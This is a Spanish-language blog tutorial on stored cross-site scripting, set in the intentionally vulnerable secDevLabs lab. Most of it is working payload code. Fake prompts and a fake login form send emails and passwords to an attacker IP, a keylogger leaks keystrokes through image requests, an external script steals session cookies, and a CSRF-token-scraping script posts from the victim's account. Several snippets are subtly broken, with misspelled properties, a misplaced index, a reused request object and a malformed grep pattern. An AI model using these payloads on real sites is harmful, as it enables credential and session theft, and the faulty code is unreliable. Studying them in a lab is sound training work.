---
title: Introducción al Cross-Site Scripting(XSS)
date: 2025-05-24 11:30:00 -0300
categories: [Web Security, Vulnerabilidades]
tags: [xss, web, inyeccion, seguridad-web, fundamentos, javascript]
description: >-
 Explorando el Cross-Site Scripting (XSS): Material de estudio
image:
  path: /assets/imgs/XSS.png # Ruta a tu imagen de vista previa (1200x630px)
  alt: Explotando el XSS
toc: true # Activa la tabla de contenidos para este post
comments: false # Habilita comentarios para este post
---
## ¿Qué es el Cross-Site Scripting (XSS)?

El XSS es un tipo de vulnerabilidad de seguridad web que permite a un atacante inyectar scripts maliciosos del lado del cliente en páginas web vistas por otros usuarios. Estos scripts pueden robar cookies de sesión, desfigurar sitios web o redirigir a los usuarios a sitios maliciosos, todo bajo el contexto de seguridad del sitio original.

> El XSS permite a los atacantes ejecutar código arbitrario (generalmente JavaScript) en el navegador de la víctima.
{: .prompt-info }

En este articulo no solo vamos a ver la teoria sino tambien la parte practica para eso es necesario levantar un laboratorio.

---

## Levantando laboratorio de practicas 

Vamos a estar jugando con este [repositorio](https://github.com/globocom/secDevLabs)

Este repositorio contiene entornos locales preconfigurados con Docker Compose para que puedas aprender de forma practica

El proyecto que vamos a estar usando es el ```A3 - Injection (XSS)```

## Secuencia de comandos para instalar el entorno

```sh
git clone https://github.com/globocom/secDevLabs
cd SecDEvLAbs
cd owasp-top10-2021-apps
cd a3
cd cd gossip-world
make install 
```
> Es importante tener make instalado 
{: .prompt-warning }
---

Una vez montado el servicio web deberiamos ver algo como esto:
![Montage finalizado con exito](/assets/imgs/cap_xss_1.png)

Ahora nos dirigimos a ```http://localhost:10007```y deberiamos ver el panel de login a explotar:
![Login panel vulnerable](/assets/imgs/cap_xss_2.png)

## Creando usuario de prueba
Pasamos a crear un usuario ```test123``` con contraseña ```test123``` para las pruebas

---
![Montage finalizado con exito](/assets/imgs/cap_xss_3.png)
![Montage finalizado con exito](/assets/imgs/cap_xss_4.png)

---

## Ejemplo de XSS 
Para ver un poco mas claro de lo que es un XSS vamos a hacer un ejemplo con el formulario ```New gossip```.<br>Para esto recomiendo que creen una publicacion nueva desde la web y vean como es que funciona.<br>
Este formulario fue creado con el proposito de crear nuevos ```gossips``` pero un atacante podria usarlo para otros fines que vamos a ver en un momento.

## Verificando si un sitio es vulnerable a XSS
Existen varias formas para verificar si un sitio es vulnerable o no, en este caso vamos a hacer uso de la etiqueta  ```<script>``` usada en html para ejecutar codigo javascript (casi siempre)
para ver si de esta forma podemos mostrar una alerta al usuario cuando este intente ver la publicacion o "gossip" que creamos.

Llenamos los campos y en la parte en la cual iría el contenido de la publicacion probamos poniendo lo siguiente: <br>

```js
<script>alert("este sitio es vulnerable a XSS")</script>
```

Deberia quedar algo asi:
![Montage finalizado con exito](/assets/imgs/cap_xss_5.png)

Ahora, cuando intentamos ver el contenido de la publicacion:

![Montage finalizado con exito](/assets/imgs/cap_xss_6.png)

Como podemos observar aparece una ventana emergente.<br>
Esto nos confirma que tenemos la posibilidad de inyectar codigo javascript desde el lado del cliente.

## Ejemplo de Phishing Basico + XSS (correo)
En este ejemplo vamos a ver como podriamos interceptar el correo del usuario cuando este visite el articulo que acabamos de crear en la web vulnerable.

El payload que vamos a usar es este: 

```js
<script>
    var mail = prompt("Ingrese sus credenciales para seguir navegando", "example@example.com");
    if(mail == null || mail == ""){
      alert("Es necesario introducir un correo valido");
    }else{
      fetch("http://192.168.101.77/?mail=" + mail);
    }
</script>  
```

Enviamos el payload usando el formulario, el atacante buscaria llamar la atencion de algun usuario poniendo titulos y subtitulos llamativos como se muestra a continuacion:


![Montage finalizado con exito](/assets/imgs/cap_xss_7.png)

Ahora cuando un usuario intente ver el contenido de este post veria algo parecido a esto: -


![Montage finalizado con exito](/assets/imgs/cap_xss_8.png)

Como es en un entorno local, podemos levantar un servidor http con python para recibir estas credenciales

---

```sh
python -m http.server 80
```

Cuando el usuario se logee con las credenciales (en este caso el email) podemos recibirlas mediante una peticion GET desde el otro lado del tunel ;) 

![Montage finalizado con exito](/assets/imgs/cap_xss_9.png)

Este es un ejemplo muy simple de lo que se puede lograr con XSS<br>


## Ejemplo de Phishing Basico + XSS (correo y contraseña)

usar ventanas emergentes nos limita mucho a la hora de intentar interceptar credenciales, ya que deberian salir dos, una por cada parametro.<br>
Esto se puede solucionar usando otro payload mucho mas trabajado para crear un formulario dentro del mismo post


```js
<div id ="formContainer"></div>
<script>
var email;
var password;
var form = '<form>' +
    'Email:<input type="email" id="email" required>' + 
    'Contraseña:<input type="password" id="password" required>' + 
    '<input type="button" onclick="submitForm()" value="Submit">' +
    '</form>';

document.getElementById("formContainer").innerHTML = form;

function submitForm(){
  email = document.getElementById("email").value;
  password = document.getElementById("password").value;
  fetch("http://192.168.101.77/?email=" + email + "&password="+ password);
}
</script>
```

Este payload una vez enviado se veria algo asi:

![Montage finalizado con exito](/assets/imgs/cap_xss_10.png)

Desde el lado del atacante:
![Montage finalizado con exito](/assets/imgs/cap_xss_11.png)



## Keylogger 

Un keylogger es un tipo de software o hardware malicioso que registra cada pulsación de tecla que un usuario hace en un teclado.<br>
El keylogger intercepta las señales del teclado y guarda la información en un archivo oculto, o la envía directamente al atacante a través de internet.

En este caso vamos a ver como podemos inyectar uno usando XSS

payload:

```js
<script>
    var k = "";
    document.onkeypress = function(e){
        e = e || window.event;
        k += e.key;
        var i = new Image();
        i.src = "http://192.168.101.77/" + k;
    };
</script>
```
desde el lado del atacante veriamos algo como esto: 


![Montage finalizado con exito](/assets/imgs/cap_xss_12.png)


para filtrar solamente por el mensaje(o teclas presionadas) podriamos usar la herramienta 'grep' con una expresíon regular

```sh
python -m http.server 80 2>&1 | grep -oP 'GET /\K[·*/s]+'

```
El output se vería algo asi:

![Montage finalizado con exito](/assets/imgs/cap_xss_13.png)


## Redirect

Tambien haciendo uso de la misma logica se podría redirigir a un usuario

```js
<script>
window.location.href = "https://www.google.com";
</script>
```

## External javascript source + secuestro de cookie de sesion

Haciendo uso de un servidor externo y un script en Javascript se puede lograr secuestrar las cookies de inicio de sesion<br>

> Esto es posible solamente si el indicador HttpOnly esta desactivado
{: .prompt-info }

payload:

```js
<script src="http://0.0.0.0/test.js"></script>
```


contenido de test.js

```js
var request = new XMLHttpRequest();
request.open('GET', 'http://0.0.0.0/?cookie=' + document.cookie);
request.send();
```

Al interpretarse el codigo js va a enviar su cookie de sesion sin saberlo


## Creando POST desde otra cuenta

Antes de hacer este ejemplo practico, necesitamos averiguar como es que se manejan las peticiones, para esto es recomendable usar Burpsuite para ver el campo completo de la request y entender que necesitamos.<br>

![burpsuite](/assets/imgs/cap_xss_14.png)

como podemos observar se necesita una peticion post a la direccion ```/newgossip``` con un campo ```tittle```, otro llamado ```subtitle```, otro campo ```text``` y por ultimo un valor llamado ```csrf_token``` que es un valor estatico (en este caso) lo que facilita la explotacion.

payload:<br> 

```js
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false)
req1.withCredentias = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response,'text/html');
var token = doc.getElementsByName("_csrf_token"[0].value);

var req2 = new XMLHttpRequest();
var data = "title=nuevopost&subtitle=automatizado+&text=blabla&_csrf_token=" + token;
req2.open('POST', "http://localhost:10007/newgossip", false);
req1.withCredentias = true;
req2.setRequestHeader('Content-Type', 'application/x-form-urlencoded')
req2.send(data);
```